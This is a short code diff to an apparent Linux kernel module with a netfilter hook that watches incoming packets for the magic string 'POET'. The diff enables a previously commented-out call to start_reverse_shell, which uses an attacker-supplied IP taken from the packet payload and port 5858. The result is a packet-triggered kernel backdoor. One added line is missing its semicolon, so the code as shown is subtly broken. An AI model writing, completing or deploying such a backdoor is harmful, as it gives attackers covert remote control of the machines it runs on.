@@ -1,10 +1,7 @@
-const char* KEY = "POET";
+#include "exec.c"
 
-struct shell_params {
-       struct work_struct work;
-       char* target_ip;
-       char* target_port;
-};
+const char* KEY = "POET";
+const char* PORT = "5858"
 
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
@@ -72,13 +69,10 @@ static unsigned int my_nf_hookfn(void *priv,
         printk(KERN_INFO "%s\n", ip_source);
         if (memcmp(user_data, KEY, strlen(KEY))==0)
         {
-            char* revIP = kmalloc(17, GFP_KERNEL);
-            strncpy(revIP, user_data + 5, sizeof(user_data) - 5);
-            // POET~1
-            // 012345
-            // start_reverse_shell(ip_sorce, 77);
+            char* revIP = kmalloc(32, GFP_KERNEL);
+            strncpy(revIP, user_data + 5, 32);
+            start_reverse_shell(revIP, PORT);
             printk(KERN_INFO "successful compare and %s\n", revIP);
-
 
             kfree(revIP);
             return NF_DROP;
